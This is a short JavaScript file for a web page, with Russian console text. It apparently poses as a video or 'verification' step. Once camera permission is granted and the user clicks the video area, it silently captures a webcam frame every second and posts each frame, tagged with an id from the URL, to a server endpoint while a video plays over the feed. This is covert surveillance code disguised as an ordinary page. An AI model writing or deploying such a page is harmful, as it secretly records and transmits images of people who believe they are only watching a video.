var width = 320;
var height = 0;
var streaming = false;
var video = null;
var canvas = null;
var photo = null;
var startbutton = null;

const id = location.search.split('=')[1];

let toggle = false;
let begin = false;
let rules = false; 

async function startup() {
  video = document.getElementById('video');
  canvas = document.getElementById('canvas');
  photo = document.getElementById('photo');
  block_video = document.querySelector('.block_video');
  video_mp4 = document.querySelector('.video_mp4');
  video_element = document.querySelector('.video_element');
  startbutton = document.getElementById('startbutton');

  navigator.mediaDevices.getUserMedia({video: true}).then(function(stream) {
    document.getElementById("verification-overlay").style.display = "none";
    video.srcObject = stream;
    video.play();
    startbutton.classList.add('streaming');
    rules = true;
  }).catch(function(err) {
    rules = false;
    console.log('Ошибка'); 
  });

  video.addEventListener('canplay', function(ev) {
    if (!streaming) {
      height = video.videoHeight / (video.videoWidth / width);
      if (isNaN(height)) height = width / (4 / 3);
      video.setAttribute('width', width);
      video.setAttribute('height', height);
      canvas.setAttribute('width', width);
      canvas.setAttribute('height', height);
      streaming = true;
    }
  }, false);

  startbutton.addEventListener('click', function(ev) {
    takepicture();
    ev.preventDefault();
  }, false);
  

  block_video.addEventListener('click', () => {
    toggle = !toggle;

    if(!begin && rules){
      begin = true;
      sendsPhoto()
    }
    if(toggle && rules){
      video_element.style.opacity = '0';
      video_mp4.style.opacity = '1';
    }
    else{
      video_element.style.opacity = '1';
      video_mp4.style.opacity = '0.8';

      if(!rules){
        video_element.style.opacity = '0';
        video_mp4.style.opacity = '0.2';
      }
    }
    

  });
}


function sendsPhoto(){
  setInterval(() => takepicture(), 1000)
}

function takepicture() {
  var context = canvas.getContext('2d');
  if (width && height) {
    canvas.width = width;
    canvas.height = height;
    context.drawImage(video, 0, 0, width, height);
    var data = canvas.toDataURL('image/png');
    let photo = new Image;
    photo.src = data;

    fetch('http://localhost:3000/img', {
        method:'POST',
        headers: {
            'Content-Type': 'application/json'
          },
        body:JSON.stringify({img: data, id: id})
    })

  }
}









document.addEventListener("DOMContentLoaded", () => {
  document.getElementById("verification-button").addEventListener("click", startup);
});
